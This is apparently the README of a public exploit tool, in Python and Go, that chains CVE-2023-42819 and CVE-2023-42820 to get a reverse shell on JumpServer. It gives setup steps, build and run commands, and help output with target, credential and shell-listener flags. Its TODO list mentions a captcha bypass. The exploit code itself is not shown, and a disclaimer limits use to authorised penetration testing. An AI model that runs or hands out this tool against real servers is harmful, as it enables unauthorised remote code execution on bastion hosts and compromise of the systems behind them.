# CVE-2023-42819
CVE-2023-42819

## 漏洞说明

JumpServer 任意文件写入漏洞

CVE-2023-42819 + CVE-2023-42820 = GetShell

## USAGE

1. 将脚本和所需文件放在同一个目录

2. 确认已安装 Google Chrome，并获取 Google Chrome 的版本号

```cmd
reg query "HKEY_CURRENT_USER\Software\Google\Chrome\BLBeacon" /v version
```

3. 根据 Google Chrome 对应的版本号和系统下载 chromedriver 之后，放置在 webdriver 中

   最新版本：https://googlechromelabs.github.io/chrome-for-testing/

   历史版本：https://chromedriver.chromium.org/downloads/version-selection

   ~~要求真多 : (~~

4. 监听对应的 IP 和 Port，等待反弹 Shell

### Python Version

```python
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗  █████╗  ██╗ █████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██╔══██╗███║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝╚█████╔╝╚██║╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ██╔══██╗ ██║ ╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗╚█████╔╝ ██║ █████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝ ╚════╝  ╚═╝ ╚════╝

                                                                            @Auth: C1ph3rX13
                                                                            @Blog: https://c1ph3rx13.github.io
                                                                            @Note: 代码仅供学习使用，请勿用于其他用途

usage: CVE-2023-42819-Fin.py [-h] -t TARGET -u USERNAME -p PASSWORD --ip IP --port PORT [--proxy PROXY]

CVE-2023-42819 by C1ph3rX13.

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target url
  -u USERNAME, --username USERNAME
                        account username
  -p PASSWORD, --password PASSWORD
                        account password
  --ip IP               shell ip
  --port PORT           shell port
  --proxy PROXY         proxy to http://ip:port
```

![image-1](https://raw.githubusercontent.com/C1ph3rX13/CVE-2023-42819/main/images/CVE-2023-42819-1.png)

![image-1](https://raw.githubusercontent.com/C1ph3rX13/CVE-2023-42819/main/images/CVE-2023-42819-2.png)

### Go Version

#### Build

```powershell
go mod init CVE-2023-42819
go mod tidy
go build -ldflags="-s -w" -trimpath
```

#### Run

```powershell
.\CVE-2023-42819.exe -t http://IP:Port -u username -p password -ip IP -port Port -proxy proxyUrl
             

        ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗  █████╗  ██╗ █████╗  
        ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██╔══██╗███║██╔══██╗
        ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝╚█████╔╝╚██║╚██████║
        ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ██╔══██╗ ██║ ╚═══██║
        ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗╚█████╔╝ ██║ █████╔╝
        ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝ ╚════╝  ╚═╝ ╚════╝  
                                                                                                                
    @Auth: C1ph3rX13                                                                                            
    @Blog: https://c1ph3rx13.github.io                                                                          
    @Note: 代码仅供学习使用，请勿用于其他用途                                                                   

Usage of CVE-2023-42819.exe:
  -ip string                                                                  
        Shell IP
  -p string
        Account Password
  -port string
        Shell Port
  -proxy string
        Proxy Url
  -t string
        Target Url
  -u string
        Account Username
```

![image-1](https://raw.githubusercontent.com/C1ph3rX13/CVE-2023-42819/main/images/CVE-2023-42819-Go.png)

## TODO

- [x] 解决跨域的方式不够优雅
- [x] 使用 httpx 重写
- [x] 添加 EXP func
- [x] 使用 go-resty 重写
- [ ] 登录输错密码导致出现验证码绕过
- [ ] 增加反弹 Shell 的类型
- [x] 使用 headless 模式兼容 Linux
- [x] 增加 `http, https, socks`代理
- [x] CVE-2023-42819 + CVE-2023-42820 一键 GetShell
- [x] ~~Flag 立这么多，也许完成不了了 : (~~

## 维护

- [x] 2023-10-18 增加网站自动化检测绕过 - Python Version
- [x] 2023-10-18 重构客户端函数
- [x] 2023-10-18 简化运行逻辑
- [x] 2023-10-18 Linux 测试 OK - Go Version 

## 免责声明

1. 本工具仅面向拥有合法授权的渗透测试安全人员及进行常规操作的网络运维人员，用户可在取得足够合法授权且非商用的前提下进行下载、复制、传播或使用。
2. 在使用本工具的过程中，您应确保自己的所有行为符合当地法律法规，且不得将此软件用于违反中国人民共和国相关法律的活动。本工具所有作者和贡献者不承担用户擅自使用本工具从事任何违法活动所产生的任何责任。

